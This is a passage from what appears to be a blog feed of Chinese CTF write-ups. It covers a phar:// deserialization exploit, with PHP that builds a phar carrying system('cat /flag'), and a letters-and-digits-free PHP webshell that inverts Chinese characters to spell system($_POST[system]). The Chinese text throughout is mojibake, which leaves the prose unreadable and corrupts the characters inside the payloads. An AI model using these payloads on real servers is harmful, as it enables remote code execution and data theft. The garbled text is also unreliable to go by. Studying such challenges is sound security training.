</p><p>åœ¨åŒå­¦çš„æç¤ºä¸‹æ‰«äº†ä¸‹ç›®å½•ï¼Œè¿™ç§ä»£ç å®¡è®¡é¢˜è¦æ‰«ç›®å½•æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ï¼Œå‘ç°æœ‰gitæ³„éœ²     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>gitä¸‹æ¥<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>ä¸€ä¸ªç±»ï¼Œevalå‘½ä»¤æ‰§è¡Œ    </p><p>ä½†æ²¡æœ‰åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–çš„ç‚¹    </p><p><code>phar://</code>ååºåˆ—åŒ–     </p><p>æºç ä¸­<code>elseif</code>ä¸­çš„<code>file_exists</code>æ”¯æŒpharåè®®ï¼›æ‰€ä»¥ä¼ å…¥<code>filepath=phar://+æ–‡ä»¶è·¯å¾„</code>å³å¯     </p><p>ç”Ÿæˆpharæ–‡ä»¶      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> TestObject();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.pharæ–‡ä»¶</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//å›ºå®šçš„</span>$phar-&gt;setMetadata($a); <span class="hljs-comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>å› ä¸ºpharæ–‡ä»¶ä¸­æœ‰ä¸€äº›ä¸å¯è§å­—ç¬¦ï¼Œä¸èƒ½ç›´æ¥å¤åˆ¶ç²˜è´´è¿›è¡Œbase64ç¼–ç     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//ä»¥äºŒè¿›åˆ¶æ‰“å¼€æ–‡ä»¶</span>$content=fread($fp,filesize($path));  <span class="hljs-comment">//è¯»å–æ–‡ä»¶</span>$content=base64_encode($content);<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre><p>ä¸Šä¼     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>è®¿é—®     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GetShell</title>
    <link href="/2021/05/19/BUU87/"/>
    <url>/2021/05/19/BUU87/</url>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜ç»™äº†éƒ¨åˆ†æºç </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span>($contents=file_get_contents($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;    $data=substr($contents,<span class="hljs-number">5</span>);    <span class="hljs-keyword">foreach</span> ($black_char <span class="hljs-keyword">as</span> $b) &#123;        <span class="hljs-keyword">if</span> (stripos($data, $b) !== <span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);        &#125;    &#125;     &#125;</code></pre></code></pre><p>ä»ç»™çš„æºç å¾—çŸ¥ä¼šæ£€æŸ¥æ–‡ä»¶çš„å†…å®¹ç¬¬å…­ä½ä¹‹å   </p><p>çœ‹WPä¼¼ä¹æ˜¯è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯      </p><p>å¯ç”¨çš„ç¬¦å·<code>$</code>ã€<code>(</code>ã€<code>)</code>ã€<code>.</code>ã€<code>;</code>ã€<code>=</code>ã€<code>[</code>ã€<code>]</code>ã€<code>_</code>ã€<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">Pç¥çš„æ— å­—æ¯æ•°å­—gethell</a>   </p><p>åˆ©ç”¨ä¸­æ–‡å’Œå–åæ“ä½œå¾—åˆ°å­—æ¯    </p><p><code>echo ~(&#39;åŒ—&#39;)[1];</code>â€“&gt;s     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);$str = <span class="hljs-string">&#x27;å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;mb_strlen($str, <span class="hljs-string">&#x27;utf-8&#x27;</span>); $i++)&#123;    $st = mb_substr($str, $i,<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);    $a = ~($st);    $b = $a[<span class="hljs-number">1</span>];<span class="hljs-comment">#å–æ±‰å­—çš„ç¬¬ä¸€ä½</span>    <span class="hljs-keyword">if</span>($b==$_GET[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-comment">#$_GET[&#x27;a&#x27;]æƒ³è¦å¾—åˆ°çš„å­—ç¬¦</span>    &#123;        <span class="hljs-keyword">echo</span> $st;<span class="hljs-keyword">exit</span>;      <span class="hljs-comment">//~($st)[1]</span>    &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">Pç¥</a>      </p><p>ä¸Šé¢çš„EXPä½¿ç”¨æ–¹æ³•      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>æ„é€ payload<code>&lt;?=system($_POST[system]);&gt;</code><br>å…ˆæ„é€ æ•°å­—1â€“&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(åŒ—)[$____];$_.=~(ç†™)[$____];$_.=~(åŒ—)[$____];$_.=~(æ‹¾)[$____];$_.=~(çš„)[$____];$_.=~(å’Œ)[$____];</code>       </p><p>_POST:<code>$___=~(æ ·)[$____];$___.=~(è¯´)[$____];$___.=~(å°)[$____];$___.=~(æ¬¡)[$____];$___.=~(ç«™)[$____];$____=~(ç°)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>æœ€ç»ˆçš„payloadï¼š<code>&lt;?=$__=[];$____=$__==$__;$_=~(åŒ—)[$____];$_.=~(ç†™)[$____];$_.=~(åŒ—)[$____];$_.=~(æ‹¾)[$____];$_.=~(çš„)[$____];$_.=~(å’Œ)[$____];$___=~(æ ·)[$____];$___.=~(è¯´)[$____];$___.=~(å°)[$____];$___.=~(æ¬¡)[$____];$___.=~(ç«™)[$____];$____=~(ç°)[$____];$_($$___[$_]);</code>    </p><p>flagä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>å°±ä¸è¡Œï¼ŒåŸå› æ˜¯PHPæ”¯æŒ<code>å˜é‡å‡½æ•°</code>,ä¹Ÿå°±æ˜¯é€šè¿‡ä¸€ä¸ªå˜é‡ä¿å­˜å‡½æ•°åï¼Œåœ¨å˜é‡ååŠ 